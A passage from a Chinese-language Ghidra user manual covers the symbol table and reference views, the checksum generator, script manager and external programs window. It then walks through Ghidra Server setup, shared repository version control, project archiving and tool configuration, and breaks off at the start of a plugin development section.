Filters。</p><ul><li>符号源（Symbol Source）：我们可以在如下勾选框中选择想要显示的符号源。</li></ul><p>User Defined：用户命名的符号。</p><p>Imported：导入信息命名的符号。</p><p>Analysis：自动分析器命名的符号。</p><p>Default(Functions)：拥有默认名称的函数符号。</p><p>Default(Labels)：拥有默认名称的非函数符号。</p><ul><li>符号类型（Symbol Type）：我们可以在如下勾选框中选择想要显示的符号类型。</li></ul><p>Instruction Labels：位于存在指令的地址的标志。</p><p>Data Labels：位于存在数据或外部标志的地址的标志。</p><p>Functions：位于函数被定义的位置的标志。</p><p>Namespaces：命名空间的名称标志。</p><p>Classes：C++类名称标志。</p><p>External Library：外部库名称标志。</p><p>Parameters：函数参数名标志。</p><p>Local Variables：局部变量名称标志。</p><p>Global Register Variable：全局寄存器变量名称标志。</p><ul><li>高级过滤设置（Advanced Filters）我们可以勾选Use Advanced Filters勾选框来显示高级过滤选项。</li></ul><p>Externals：只接受外部标志。</p><p>Non-Externals：只接受非外部标志。</p><p>Primary Labels：只接受地址上的首要标志。应用于标签与函数。</p><p>Non-Primary Labels：只接受地址上的非首要标志。应用于标签与函数。</p><p>Globals：接受全局命名空间中的标志。应用于标签、函数、命名空间与类。</p><p>Locals：接受不在全局命名空间中的标志。应用于标签、函数、命名空间与类。</p><p>Register Variables：接受基于寄存器的函数参数或局部变量。</p><p>Stack Variables：接受基于栈的函数参数或局部变量。</p><p>Entry Points：接受位于外部入口点的标签或函数。</p><p>Subroutines：接受被某指令调用的标签。</p><p>Not In Memory：接受位于不在内存中的地址上的标签。</p><p>Unreferenced：接受没有被引用过的标签或函数（也被称为dead code）。</p><p>Offcut Labels：接受不在指令或数据开始处的标签。应用于标签。</p><p><strong>4.6.2 符号引用表</strong></p><p>窗口右侧的符号引用表显示了关于引用的信息。当我们在符号表中选中了一个符号时，符号引用表中会显示该标志的引用信息。</p><p>我们可以通过以下三个切换按钮来控制显示的引用类型：References To、Instruction From和Data From，他们分别对应这三个图标 <img src="blob:file:///745c3cbc-86d7-4f73-8cc5-f63086f4b8de" alt="202004031114_A6WT94PQ86CRQJ2.png">。</p><p>References To显示所有对当前选中的符号的引用。</p><p>Instruction From开启状态下，如果所选符号对应一个函数或是子路径的入口点，所有引用该子路径&#x2F;函数的指令将会被显示。如果所选符号不是一个子路径&#x2F;函数的入口点，所显示内容将为空白。</p><p>Data From：开启状态下，如果所选符号对应一个函数或是子路径的入口点，所有引用该子路径&#x2F;函数的数据将会被显示。如果所选符号不是一个子路径&#x2F;函数的入口点，所显示内容将为空白。</p><p><img src="blob:file:///d22fcd00-bf2b-4dd5-a578-fca2b4117b35" alt="202004031115_UAZ5KPKG8RXG9K3.png"></p><p>图4-15 符号引用表</p><p>如上图所示，符号引用表所显示的列如下：</p><p>Address：对应所选符号的地址。点击地址将能够在CodeBrowser中进行导向（重定位）。</p><p>Laebl：显示所选符号引用地址的主要符号名称。</p><p>Subroutine：显示所选符号引用地址的子路径&#x2F;函数名称。</p><p>Access：指示引用类型。</p><p>Preview：引用源位置的指令或数据的预览。</p><p>#ghidra使用手册</p><p><strong>4.7 Checksum Generator</strong></p><p>Ghidra方便地为我们提供了Checksum生成器。我们可以从Tools→Generate Checksum…或者Window→Checksum Generator来调出Checksum生成器窗口。</p><p><img src="blob:file:///dd5cc85a-4fe6-4289-ba17-407f60450dc0" alt="202004031116_ZXKSS7AP97CCAE4.png"></p><p>图4-16 Checksum生成器</p><p>可以看到窗口右上角有一些图标 <img src="blob:file:///3aaada51-8c58-4f56-83e5-374e1cbf6248" alt="202004031116_33U4U4AB5QVYR8K.png">，我们将从左到右对其一一进行介绍。</p><p>1’s Complement：对当前checksum进行1’s complement 操作</p><p>2’s Complement：对当前checksum进行2’s complement 操作</p><p>XOR：对当前checksum进行异或操作</p><p>Carry：对当前checksum进行进位操作</p><p>On Selection：当该按钮被选中时，只生成当前选中内容的checksum。反之，则生成整个程序中所有字节的checksum。</p><p>As Hex：切换显示十六进制值或是十进制值。</p><p>Refreshes Checksum：刷新所生成的checksum。大多数情况下，checksum值会自动更新。</p><p>#ghidra使用手册</p><p><strong>4.8 Script Manager</strong></p><p>脚本管理器（Script Manager）允许我们高效地对Ghidra的功能进行扩展开发。不像传统的Ghidra插件那样需要一个完整的开发环境，我们可以在运行Ghidra的同时开发Ghidra脚本。我们可以对脚本做出更改并立即执行。</p><p><img src="blob:file:///e002abbc-9f39-49ac-83b1-c9336bced43c" alt="202004031117_SVPCB6RPGDSVDS2.png"></p><p>图4-17 脚本管理器</p><p>如上图所示，我们可以看到脚本管理器的窗口包括以下部分。</p><p>Script Category Tree：靠左侧的脚本类型树将脚本按类型组织。</p><p>Script Table：窗口中间最大的部分显示了脚本的各类信息。包括：</p><p>   第一列指示是否应该为了该脚本创建一个操作。如果一个脚本拥有菜单路径，或是默认的按键绑定，选中该列中的勾选框会导致对菜单路径&#x2F;按键绑定的操作。</p><p>   第二列指示了该脚本的状态。如果空白这说明该脚本没有问题。</p><p>   Filename列显示了该脚本的文件名。</p><p>   Description列显示了脚本元数据中的描述。</p><p>   Key Binding列则显示了脚本所关联的按键绑定。</p><p>Filter：过滤器，我们可以用它来搜索想要寻找的脚本。</p><p>Description Panel：在窗口最下侧，显示了所选脚本的元数据，包括其作者、描述、按键绑定等。</p><p>我们会在后面的章节当中详细介绍如何开发Ghidra的脚本。</p><p>#ghidra使用手册</p><p><strong>4.9 External Programs</strong></p><p>外部程序（External Programs）窗口显示了外部程序名以及与它们相关联的Ghidra程序文件。我们选择Window→External Programs将其打开。</p><p><img src="blob:file:///c1efdf53-fbe5-4743-9bf5-98b452e20a4b" alt="202004031118_68G2MF6DA8NJJJS.png"></p><p>图4-19 外部程序窗口</p><p>Name列中显示了外部程序的名称。</p><p>Ghidra Program列中显示了与外部程序名称所关联的Ghidra文件。如果显示空白，则说明没有外部引用被解析。如果外部程序名称未与Ghidra文件关联，Ghidra不能够找到外部引用。</p><p><strong>4.9.1 添加外部程序名称</strong></p><p>点击 <img src="blob:file:///701e22ef-6302-4f91-bc44-1e2b90e797b2" alt="202004031118_ND6NRP9MTDJQY8M.png">图标以创建新的外部程序名称。</p><p><strong>4.9.2 设置外部名称的关联</strong></p><p>选中一个外部程序名称，并点击 <img src="blob:file:///78403896-fdcb-4a45-bdf6-2c2047e07187" alt="202004031118_72X2Y5QTTW4HP55.png">图标以设置对其关联的外部程序。选中多个外部程序名称时，该按钮不可用。</p><p><img src="blob:file:///3d322ce1-39c5-421c-aa8f-f6e4ade9b4ae" alt="202004031119_FRR3XCFKWRKSUN3.png"></p><p>图4-20 设置外部程序关联</p><p>#ghidra使用手册</p><p><strong>5.1 搭建Ghidra Server</strong></p><p>一个Ghidra项目中包含某个逆向工程的进度。Ghidra项目将程序进行组织并允许多个用户进行合作。Ghidra中引入了项目池（project repository）的概念，项目仓库中可能有记录了版本的、共享的、或是私有的文件。多个用户可以在共享的项目当中添加文件，获取服务端的文件并且创建新版本的文件。私有文件则存在于本地。</p><p>由于本地（非共享）的项目管理非常简单明了，在以下章节当中我们会主要介绍基于Ghidra Server的共享项目管理。</p><p>在开始创建项目之前，我们需要先搭建一个Ghidra服务器。Ghidra服务端的功能已经被涵盖于标准的Ghidra发行版本当中。我们会在以下的内容中从头开始搭建一个Ghidra服务器。用于示例的操作系统为Windows 10。</p><p>我们首先用第1章当中介绍过的方式，下载、解压并配置好Ghidra的运行环境。</p><p>切换到Ghidra的目录当中，进入server目录，可以看到有以下文件（夹）。</p><p><img src="blob:file:///383d3460-c550-4b61-85d4-2c3214796d17" alt="202004031124_EEWHPMCJRQ4BYA4.png"></p><p>图5-1 server目录</p><p><strong>5.1.1 服务器配置</strong></p><p>在安装以及运行Ghidra服务器之前，我们需要修改server.conf文件来满足我们的特定需求。</p><p><img src="blob:file:///5e781f89-46f3-44d0-baa2-b0bb934fe4b2" alt="202004031124_TJJXHJ68SUKZ67T.png"></p><p>图5-2 配置文件</p><p>在文件当中，找到这样的行：</p><p><a href="wrapper.app"><em>wrapper.app</em></a><em>.parameter.#</em></p><p><img src="blob:file:///6009ec30-64ed-4858-a6dd-ccdec5e39299" alt="202004031125_8VS6MQG84PRUTJM.png"></p><p>图5-3 定位到这样的行</p><p>这些行代表了启动Ghidra服务器时的参数，#说明该行代表第个参数，编辑或添加时应当注意不要使#重复。行的等号右侧则代表了所对应的具体的参数。</p><p>启动的参数应如下列格式：</p><p>[-ip ###.###.###.###] [-p#] [-a#] [-anonymous] [-ssh] [-d<ntDomain>] [-e<days>] [-u] [-n] <repositories_path></p><p>其中，[-ip ###.###.###.###]: 绑定的ip地址（默认情况下将被绑定至hostname）。</p><p>[-p#]：使用的TCP端口（默认为13100）。</p><p>[-a#]：选择授权模式，其中#可以是0或2;</p><p>  0 - 用户私钥</p><p>  1 - PKI授权</p><p>[-anonymous]：启用匿名的仓库访问。</p><p>[-ssh]：启用SSH认证。</p><p>[-e<days>]：指定密码过期时间（单位为天），默认时间为1天，只可用于a0模式。</p><p>[-u]：要求用户输入用户ID，不应用于a2模式。</p><p>[-n]：在登录时启用IP地址反向名称查询。</p><p><repositories_path>：指明存储项目仓库的目录。</p><p>在图5-3中所显示的两行，表明使用了a0，也即是用户私钥的授权方式；而存储仓库则位于${ghidra.repositories.dir}这个变量当中，这个变量也被定义于该文件中，我们可以找到：</p><p><em>ghidra.repositories.dir&#x3D;.&#x2F;repositories</em></p><p>通常来说，我们应该避免使用这个默认的仓库地址，最为正确的做法是指定一个位于Ghidra安装目录之外的文件夹并使用绝对路径。因此，我们将其改为</p><p><em>ghidra.repositories.dir&#x3D;D:\test</em></p><p>当升级Ghidra时，我们需要将之前的参数设置从旧的server.conf复制到新的server.conf当中。我们不应该复制整个旧的server.conf文件，这可能会影响Ghidra服务的运行。</p><p><strong>5.1.2 用户授权</strong></p><p>Ghidra服务器支持多种授权认证模式。</p><p>1 无认证：任何被添加的用户都可以任意连接服务器。</p><p>2 本地Ghidra密码（-a0）：与被添加用户所关联的密码被维持于仓库目录的users目录当中。当用户连接服务器时，会被要求输入密码。当一个用户被添加时，默认的密码会是changeme。</p><p>3 PKI授权（-a2）：利用PKI用户证书进行授权认证。用户的证书需要是受信任的CA所颁发，并被添加到Ghidra服务器cacerts文件当中。</p><p>4 SSH密钥：当本地密码模式被使用时（-a0），SSH认证也会被支持，目前该模式只支持对无头的分析器的使用。</p><p>在我们的实例当中，我们仅使用比较易用且通用的本地密码模式（-a0）做示范。</p><p><strong>5.1.3 服务器内存管理</strong></p><p>我们同样可以在server.conf文件当中设置服务器最大的使用内存。</p><p><a href="wrapper.java"><em>wrapper.java</em></a><em>.maxmemory</em></p><p>我们可以用如下的公式来估算一个合适的最大内存值。</p><p><a href="wrapper.java"><em>wrapper.java</em></a><em>.maxmemory&#x3D;2(16+(32 FileCount&#x2F;10000) + (2 * ClientCount))</em></p><p>其中FileCount指仓库中的最大文件数，ClientCount指同时连接的Ghidra客户端数量。我们可以使用Java VisualVM工具来检视服务器运行时所使用的内存。该工具不在Ghidra发行包当中。</p><p>在我们的实例当中，我们假设仓库当中最大文件数为5000个左右，且同时连接的客户端数量约为4个，那么我们根据计算得出</p><p><a href="wrapper.java"><em>wrapper.java</em></a><em>.maxmemory&#x3D;2(16+(325000 &#x2F; 10000)+（2*4))&#x3D;80</em></p><p>默认的maxmemory值为768（MB），因此内存应该是完全够用的，我们便不对其进行改动。</p><p><strong>5.1.4 运行服务器</strong></p><p>完成了以上配置之后，我们便可以安装并运行服务器。</p><p><em>.svrInstall.bat</em></p><p>这能将服务器安装为服务并开始运行。如果想要移除安装的服务器服务：</p><p><em>.svrUninstall.bat</em></p><p>ghidraSvr.bat文件则为我们提供了对服务器一系列的指令。可用的参数包含：</p><p>console：在当前的终端窗口运行服务器。</p><p>start：开始运行安装好的Ghidra服务器服务。</p><p>stop：停止运行安装好的Ghidra服务器服务。</p><p>restart：停止并重启安装好的Ghidra服务器服务。</p><p>status：显示当前的Ghidra服务器服务状态。</p><p>比如，我们想要重启目前已经在运行的服务，输入</p><p><em>.ghidraSvr.bat restart</em></p><p>在Linux或macOS下对Ghidra服务器的搭建非常类似，只需要运行所对应的shell文件即可。</p><p>#ghidra使用手册</p><p><strong>5.2 创建项目</strong></p><p>之前我们完成了服务器的搭建，接下来我们会在服务器当中创建项目。首先，我们要在服务端添加用户。Ghidra服务器用于管理的脚本为svrAdmin.bat，其用法如下：</p><p>svrAdmin.bat [<server-root-path>]</p><p>        [-add <user_sid>]</p><p>        [-remove <user_sid>]</p><p>        [-reset <user_sid>]</p><p>        [-dn <user_sid> “<user_dn>”]</p><p>        [-admin <user_sid> “<repository_name>”]</p><p>        [-list]</p><p>        [-users]</p><p>        [-migrate-all]</p><p>        [-migrate “<repository_name>”]</p><p>我们将对这些参数作出说明：</p><p><server-root-path>：我们通常没有必要指明该参数。服务器根路径默认取决于server.conf文件的ghidra.repositories.dir变量。</p><p>-add：用于添加用户，在我们使用的-a0模式下，用户的初始密码会被设置为changeme。该密码需要在24小时内修改以避免过期。</p><p><em>svrAdmin.bat -add mySID</em></p><p>-remove：用于移除用户。该命令不会对被移除用户所作的操作历史产生影响。</p><p><em>svrAdmin.bat -remove mySID</em></p><p>-reset：用于重置用户的Ghidra密码。如果一个用户的密码过期，或被遗忘，我们可以用指令将密码重置为changeme。同样的，重置后密码需要在24小时内被用户更改。</p><p>-dn：用于分配用户的标识名。使用PKI认证时，每个用户的标识名需要与他们的用户SID相关联。使用方法：</p><p><em>svrAdmin.bat -dn mySID “CN&#x3D;MyName,OU&#x3D;AGENCY,OU&#x3D;DoD,O&#x3D;U.S.Government,C&#x3D;US”</em></p><p>-admin：用于添加仓库管理员。服务器管理员可以用该指令指定新的仓库管理员，用法：</p><p><em>svrAdmin.bat -admin mySID”myProject”</em></p><p>-list：用于列出全部仓库。可以与-users一起使用以显示每个仓库的用户列表。</p><p>-users：用于所有能够访问服务器的用户。</p><p>-migrate-all：用于将所有仓库迁移至一个索引文件系统当中。迁移会与Ghidra服务器重启时发生。需要注意的是，该操作是单向的，所以我们建议在迁移之前做好仓库的备份。</p><p>-migrate：将指定的仓库迁移至索引文件系统中。用法：</p><p><em>svrAdmin.bat -migrate “myProject”</em></p><p>在我们的服务器当中，我们需要先添加用户。虽说官方文档当中说明要添加SID，但实际上我们添加的内容只是简单的用户名。</p><p>命令行输入：</p><p><em>.svrAdmin.bat -add trident</em></p><p>确定我们Windows防火墙的设置能够放行。服务器开启后，我们可以在另一台机器中打开Ghidra，并创建一个分享项目。打开Ghidra，点击File→New Project，选择Shared Project，并输入服务器的IP地址或是DNS名，输入端口号（我们的服务器使用了默认的13100端口）。</p><p><img src="blob:file:///4833c618-ef07-4b49-8b16-c317eb077894" alt="202004031126_KGZY5VMDUNDKRF6.png"></p><p>图5-4 创建分享项目</p><p>这里在使用时应该先创建与本机名称一样的userID </p><p>用 .svrAdmin.bat -add 创建</p><p>接下来我们输入密码（初始密码为changeme），这时将会弹出一个对话窗口提醒我们修改密码。设定完新密码之后，我们便可以创建新的仓库。</p><p><img src="blob:file:///99019444-603e-4998-8e59-d00d67e2e851" alt="202004031126_M4VFQ7GYHVE5SMM.png"></p><p>图5-5 创建仓库</p><p>接下来我们对该仓库的权限进行设置</p><p><img src="blob:file:///1fd72b30-eee9-4827-ba24-bcd9b6430958" alt="202004031127_SE8GP7W2C5GUY6D.png"></p><p>图5-6 权限设置</p><p>再设置完仓库的本地路径，我们便完成了这个分享项目的创建。</p><p>#ghidra使用手册</p><p><strong>5.3 项目仓库</strong></p><p>Ghidra中的项目仓库可以被记录版本，也即是说，我们可以追踪一个项目的所有改动历史。仓库支持签入、签出、版本历史。项目仓库在有或没有Ghidra服务器的情况下，都能够使用。如果项目被关联于一个Ghidra服务器，多个用户便可以同时访问该项目当中的文件。</p><p>我们将继续以5.2当中所创建的项目仓库为例进行一步步的说明。当我们在客户端将这个共享的项目打开时，Ghidra会尝试连接到该项目所关联的服务器。如果所关联的服务器不在运行，我们仍可以在本地工作于已经签出的文件，但不能访问未签出的文件。我们可以通过项目窗口右下角的线缆图标 <img src="blob:file:///8127b96f-2217-498e-b309-b1caffb4ef26" alt="202004031128_XVJHC9RNKJCAX7G.png">快速地判断是否连接到服务器。如果该图标中线缆成断开状态，我们可以点击它来尝试进行重连。</p><p><strong>5.3.1 版本控制</strong></p><p>我们可以在Ghidra项目窗口中选中一个或多个程序，并点击工具栏中的 <img src="blob:file:///a24b24a4-dc92-4376-87b4-86fa052f5d3c" alt="202004031128_KB7D374JQDM2747.png">图标，或是右键并选择Add to Version Control…。这将弹出一个对话窗口，我们可以在其中输入对该文件的注释。</p><p><img src="blob:file:///0d972ff8-ca55-4539-9b37-de9b73e1e32e" alt="202004031128_EF4QJYCYDC9TDQ9.png"></p><p>图5-7 将项目中的crackme_example加入版本控制</p><p>勾选Keep File Checked Out，这样我们就不用在加入版本控制之后再将crackme_example签出。Apply to All按钮在我们选中了多个文件时可用，我们可以将输入的注释应用到所有将要添加到版本控制的文件之上。</p><p>如下图，我们可以看到已经签出的文件图标右下角会有一个绿色背景的勾. <img src="blob:file:///901f0c9d-113b-4bae-a138-0d74a8678970" alt="202004031129_FAM73T4D446VF5G.png">而紫色背景的勾 <img src="blob:file:///78f21e4d-2ff4-4388-b9dd-2b81c0f61a26" alt="202004031129_ZT869ATHTDPRUAP.png">则代表该文件为其他用户签入的新版本。</p><p><img src="blob:file:///820d52a9-67ca-4e1d-8d9b-d307cce75564" alt="202004031129_AJMJKKYWS3ZXU5C.png"></p><p>图5-8 已签出的crackme_example</p><p><strong>签入</strong></p><p>当我们做完改动并保存之后，便可以签入文件（我们不能签入未被改动的文件）。签入会创建该文件的一个新版本。右键选择想要签入的文件，并在工具栏当中选择签入图标 <img src="blob:file:///c74bb980-7a42-4f48-a61d-d75065fb0d57" alt="202004031129_9MTNS3F2MRNA855.png">，或者在右键菜单中选择Check In…。这将弹出一个对话窗口，我们可以在其中注释描述我们所做的改动。我们可以勾选Keep File Checked Out来接着签出该文件。我们可以勾选Create “.keep” file来在本地文件系统当中创造一个即将签入的文件的拷贝。</p><p>在一个共享的项目仓库当中，我们签入文件时，文件中的改动可能会与服务器当中最新的版本合并。在大多数情况下，合并都将是自动的，不需要任何干涉。然而，如果改动导致了冲突，我们需要在签入时解决冲突。当另一个用户签入他的文件时，我们可以通过导向标记查看从我们签出文件之后他所做的改动。潜在的冲突将以红色标出。我们接下来会更详细地介绍合并的过程。</p><p><strong>签出</strong></p><p>我们可以选择文件后点击 <img src="blob:file:///c8eac30a-d298-4e94-ad7f-a271d44a428a" alt="202004031130_RS87GSJSHZZ74Q7.png">图标，或者在右键菜单当中选择Check Out…。这将弹出一个对话窗口。</p><p><img src="blob:file:///e283aad3-6f3c-473b-9d11-86118a476768" alt="202004031130_VUX43CCYQSWY22R.png"></p><p>图5-9 签出文件</p><p>我们可以通过勾选Request exclusive check out来确保其他用户不能签出该文件。如果选中的文件已经被其他用户签出，我们则无法勾选该选项。在我们计划对内存映射做出操作时，勾选该选项是必要的。</p><p><strong>撤销签出</strong></p><p>我们有时可能希望撤销签出操作，这样我们便可以放弃所有的更改，文件也会还原到服务器当中的最新版本。选中文件，并点击 <img src="blob:file:///991181b0-541c-4d80-a4df-ac6bcb4f568d" alt="202004031130_7JFC3GE2QJX93VH.png">图标，或是在右键菜单当中选择Undo Checkout选项。如果我们在此之前对文件进行了更改，这将弹出一个对话窗口以确认我们的操作。</p><p><img src="blob:file:///fdc17af2-9efb-47b4-b883-921da261eb46" alt="202004031130_A8CPXD2E9TWG2YG.png"></p><p>图5-10 撤销签出</p><p>类似地，勾选Save copy of the file with a .keep extension勾选框，我们可以创建一个私人的文件复制，扩展名为.keep。如果我们尝试在文件于CodeBrowser中打开时撤销签出，将会看到一个错误信息。我们必须要先关闭文件，才能撤销签出。</p><p><strong>更新</strong></p><p>当我们工作于一个共享项目仓库当中的文件时，我们需要时不时地更新程序以获取其他人所做出的改动。选择文件并点击 <img src="blob:file:///0829fc2a-affa-4b60-8ce3-e12ab45a123b" alt="202004031131_WVQVK7FXZ8P27FT.png">图标，或是在右键菜单当中选择Update…选项，我们便能将仓库中最新版本的程序同步于本地。如果我们的改变与最新版本中的改动产生了冲突，我们会被要求这些改动内容。</p><p><strong>撤销劫持</strong></p><p>当我们在本地的私人文件与仓库中存在的文件同名时，该私人文件便会被劫持。当另一个用户将文件添加到版本控制中，且我们本地存在同名私人文件时，会发生这种情况。如果想要撤销劫持，我们选中文件，并点击 <img src="blob:file:///2c9e6176-ccba-4417-8df9-572ed15c8e48" alt="202004031131_8KD35GVE7VJ8CXJ.png">图标，或者在右键菜单当中选中Undo Hijack…。这将弹出一个对话窗口。类似地，我们可以选择性地创建一个扩展名为.keep的文件复制。</p><p><strong>查看版本历史</strong></p><p>我们可以右键点击一个文件，并选择Show History…选项。这将弹出一个表格，显示版本创建的日期、创建用户、和版本注释。</p><p><img src="blob:file:///b715a642-4759-4846-8447-28923f0d8cd7" alt="202004031131_KU5MATTV65BQUDX.png"></p><p>图5-11 版本历史</p><p>我们可以在这其中方便地浏览历史中的任意版本，右键点击某个版本，并选择Open With→&lt;指定的工具&gt;，我们便可以通过指定的工具打开该版本的文件。这个版本将会以只读模式打开，我们可以对该文件作出更改，但是只能将其保存至新的名字。</p><p>此外，如果我们是仓库管理员，且该文件未被签出，我们可以删除最新或最老的版本。</p><p><strong>查看签出</strong></p><p>我们可以右键点击文件并选择View Checkouts…选项来查看文件被哪些用户签出。调出的表格中会显示签出日期与签出文件的版本号。</p><p><img src="blob:file:///66c3c21d-e61c-416e-a8dd-e1809681d973" alt="202004031132_9UGCE4NMGXHCKAN.png"></p><p>图5-12 查看签出</p><p>如果某个用户签出了某文件，且不将其签入或撤销签出，管理员可以通过右键点击并选择Terminate the checkout来终止该签出。</p><p>如果想要查看某个文件夹下所有我们签出的文件，我们需要右键点击一个文件夹，并选择Find Checkouts…。</p><p><strong>5.3.2 权限控制</strong></p><p>在5.2当中，我们展示了在创建一个项目仓库时，需要对权限控制进行设置。在创建完成之后，如果有管理权限，我们也能够再次对权限进行修改。只需要在项目窗口选择Project→Edit Project Access List便能够调出对权限的编辑窗口。</p><p>#ghidra使用手册</p><p><strong>5.4 存档</strong></p><p>我们可以通过存档当前项目（Archive Current Project）将目前打开项目的所有内容储存到指定的文件名下。开始存档前，我们需要将所有运行的工具关闭。</p><p><strong>5.4.1 为什么要存档</strong></p><p>1 项目会被保存至一个对不同的Ghidra版本都兼容的文件格式。</p><p>2 存档一个项目并不会将该项目移除，对该项目的继续使用没有影响。</p><p>3 这是一个非常简单高效的备份方式。</p><p><strong>5.4.2 如何存档</strong></p><p>1 关闭所有工具。</p><p>2 在项目窗口，选择File→Archive Current Project…。</p><p>3 这将弹出一个对话窗口，在其中指定存档文件保存的位置与名称，并点击OK。</p><p><img src="blob:file:///de3cdb4e-3468-459b-b3cb-df404e95f1d4" alt="202004031133_WX54CEU3G2BNYQM.png"></p><p>图5-13 存档</p><p><strong>5.4.3 恢复存档</strong></p><p>我们可以将存档的项目文件恢复为一个活跃的项目。</p><p>1 如果当期有打开的项目，选择File→Close Project将其关闭。</p><p>2 选择File→Restore Project…。</p><p>3 在弹出的窗口中指定想要恢复的存档文件（Archive File）、新项目的位置（Restore Directory）与名称（Project Name）。</p><p><img src="blob:file:///23eb0778-4b28-40e4-b282-4e01bfa9040e" alt="202004031133_HTJJ4VJ29654XJH.png"></p><p>图5-14 恢复存档</p><p>4 如果恢复项目的位置存在一个同名项目，将会弹出窗口提醒我们，项目已存在（Project Exists）。</p><p>#ghidra使用手册</p><p><strong>6.1 默认工具</strong></p><p>一个Ghidra的工具即是一系列插件（Plugins）的集合。我们可以通过组合不同的插件创建工具。Ghidra提供了很多的插件，不过我们也可以创建自己的插件并将其添加到我们的工具当中。</p><p><strong>6.1 默认工具</strong></p><p>之前介绍的CodeBrowser即是Ghidra所提供的默认工具，其默认显示于我们的工具箱当中，且包含了所有的核心插件。图标为 <img src="blob:file:///31251f5d-3f37-4340-b8ff-1d4d6dd16eb3" alt="202004031401_QCKND995E3HECKH.png">。我们可以在任何时候将其重新导入到工具栏当中。操作如下：</p><p>1 在项目窗口中选择Tools→Import Default…。</p><p>2 在弹出的对话窗口中选择一个默认工具（CodeBrowser，或是Version Tracking），并点击OK。</p><p>3 默认工具将被添加至工具栏当中。如果该默认工具已经存在，那么新添加的默认工具名称将会带上一个数字后缀，比如: CodeBrowser_1。</p><p>#ghidra使用手册</p><p><strong>6.2 工具管理</strong></p><p><strong>6.2.1 创建工具</strong></p><p>创建工具能够创建一个空的工具（不含任何插件）。我们可以根据工具的用途来给它添加插件。一个创建工具的整体过程应该如下：</p><p>1 确定我们对该工具的需求。</p><p>2 确定现存的插件是否能够满足我们的需求。如果现存的插件无法提供对应的功能，我们可能需要自己编写插件。</p><p>3 将这些插件添加到现存的工具或是一个新的工具中。</p><p>创建新工具的具体操作为：</p><p>1 在项目窗口，选择Tool→Create Tool…选项。</p><p>2 这将显示一个空的工具，并弹出配置工具的对话窗口。</p><p><img src="blob:file:///ffcdc5e8-4305-4a6f-a9d1-ef1d6259fd96" alt="202004031442_UWCCWYM9ST26YFT.png"></p><p>图6-1 配置工具窗口</p><p><strong>6.2.2 配置工具</strong></p><p>如图6-1所示，我们可以在配置工具的窗口下对工具进行配置，即是在一个工具上增加&#x2F;移除插件包，或是单独的插件。</p><p>我们可以通过勾选插件包对应的勾选框，增添（或移除）该包中的所有插件。需要注意的是，Experimental包不能够整包添加，我们只能够单独添加其中的插件。点击Configure链接，我们便可以对插件进行单独的添加或移除。</p><p><img src="blob:file:///91631757-9ad1-47e2-9db4-d05db8b34f26" alt="202004031442_G9YRSKQJ4SFFDFZ.png"></p><p>图6-2 单独添加插件</p><p><strong>6.2.2 将工具保存至工具栏</strong></p><p>我们可以在工具当中，选择File→Save Tool，来保存该工具。</p><p>如果想要将工具保存为另外的名字，或是想要更换工具图标：</p><p>1 在工具中选择File→Save Tool As…。</p><p> <img src="blob:file:///fe1c1c41-1058-4364-8fa3-8fbb56750ef4" alt="202004031443_7ZZAPPKHR5C44XR.png"></p><p>图6-3 保存工具</p><p>2 在弹出的对话窗口中输入新的工具名字。</p><p>3 选择新工具的图标，并点击Save。</p><p><strong>6.2.3 导出工具</strong></p><p>我们可以将工具以XML文件导出，这样便可以与其他用户分享我们的工具。</p><p>在项目窗口中导出工具：</p><p>1 选择File→Export Tool，并选中想导出的工具。</p><p>2 指定导出的文件位置与名称。</p><p>或者是，</p><p>1 右键点击想要导出的工具图标，选择Export…。</p><p>2 指定导出的文件位置与名称。</p><p>需要注意的是，如果工具包含了Ghidra所不含的插件，比方说，我们自己写的新插件。这种情况下我们需要将包含插件类文件的jar文件跟XML文件一起发布。</p><p><strong>6.2.4 导入工具</strong></p><p>我们可以将被导出的XML文件导入至Ghidra的工具栏当中。</p><p>1 在项目窗口，选择Tools→Import Tools to Tool Chest…。</p><p>2 选择一个.tool或是.obj扩展名的文件，并点击Import。</p><p>3 工具将被添加至工具栏当中。如果该工具已经存在，那么新添加的工具名称将会带上一个数字后缀，比如: CodeBrowser_1。</p><p><strong>6.2.5 编辑插件路径</strong></p><p>我们在之前提到过，如果想要将含有自己所编写的新插件的工具发布，需要将包含插件类文件的jar文件一起发布。而想要导入该工具的用户则需要将该jar文件放置于Ghidra的插件路径下。</p><p>如果我们想要增添一个插件路径：</p><p>1 在项目窗口当中选择Edit→Plugin Path…。</p><p>2 一个编辑插件路径的对话窗口将会显示；</p><p> <img src="blob:file:///c0da2c7d-880a-43a0-9f5d-84db698be028" alt="202004031443_YVK257KZAUSF2R2.png"></p><p>图6-4 编辑插件路径</p><p>在该窗口当中，选择Add Jar…或是Add dir…按键来选择一个jar文件或是一个目录。在文件选择对话中选择jar文件或是目录。</p><p>1 点击Apply（关闭窗口）或OK（不关闭窗口）。</p><p><strong>更改搜索顺序</strong></p><p>我们可以更改用户插件路径列表中的搜索顺序，选择一个插件路径，并点击向上或向下的箭头图标。搜索顺序由上至下。</p><p><strong>设置用户插件Jar目录</strong></p><p>我们可以在User Plugin Jar Directory处，输入一个绝对路径，或是点击…按键，在文件系统中选择一个目录。</p><p><strong>6.2.6 工具连接</strong></p><p>Ghidra中不同的工具能够分享数据并动态地互动，我们可以说这些工具是被连接的。工具通过工具事件（tool events）被连接。当我们：</p><p>1 打开或关闭程序。</p><p>2 将光标移动至程序中的另一位置。</p><p>3 在程序当中做出选择。</p><p>工具便会生成事件。</p><p>工具的连接是有方向性的。也就是说，我们可以将工具A与B单方向地连接，工具B能够接收使用A生成的事件，而A不能够接收使用B所生成的事件。我们也可以将A与B双向的进行连接。</p><p><strong>自动的工具连接</strong></p><p>当我们：</p><p>1 将一个运行工具的图标拖动至另一个运行工具当中。</p><p>或是</p><p>2 在工具栏中将一个工具图标拖动到一个运行工具的图标上。</p><p>工具会被自动且双向地连接。这也是连接工具最快捷的方式。</p><p><strong>手动的工具连接</strong></p><p>我们同样也可以手动地连接工具。在项目窗口当中选择Tools→Connect Tools…。</p><p>这将弹出用于手动创建工具连接的对话窗口。</p><p>1 在Event Producer列表当中选择生成事件的工具。</p><p>2 在Event Consumer列表当中选择接收使用事件的工具。</p><p>3 在Events Names列表当中选择需要被连接的事件。</p><p>需要注意的是，只有在我们想选择具体的连接事件时，手动的工具连接才会显得有用。如果只是想将所有工具的所有事件进行双向的连接，我们可以简单地点击Connect All按键。</p><p>#ghidra使用手册</p><p><strong>6.3 插件开发</strong></p><p>有时，Ghidra自带的插件集合不能够满足我们的需求，这时我们可能需要自己开发插件。</p><p><strong>6.3.1 